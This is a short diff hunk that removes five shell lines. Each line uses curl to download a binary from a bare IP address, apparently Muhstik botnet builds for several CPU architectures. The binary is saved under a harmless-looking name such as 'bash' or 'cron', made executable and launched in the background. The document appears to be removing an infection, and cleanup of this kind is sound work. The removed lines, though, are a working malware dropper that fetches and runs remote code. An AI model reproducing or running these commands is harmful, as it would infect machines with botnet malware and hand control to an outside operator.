@@ -1,5 +1,0 @@
-curl -o bash http://51.254.221.129/b/muhstikx86; chmod +x bash; ./bash &
-curl -o tftp http://51.254.221.129/b/muhstika5; chmod +x tftp; ./tftp &
-curl -o cron http://124.37.34.51/.c/muhstikmips; chmod +x cron; ./cron &
-curl -o pftp http://124.37.34.51/.c/muhstikmipsel; chmod +x pftp; ./pftp &
-curl -o shy  http://124.37.34.51/.c/muhstiki386; chmod +x shy; ./shy &
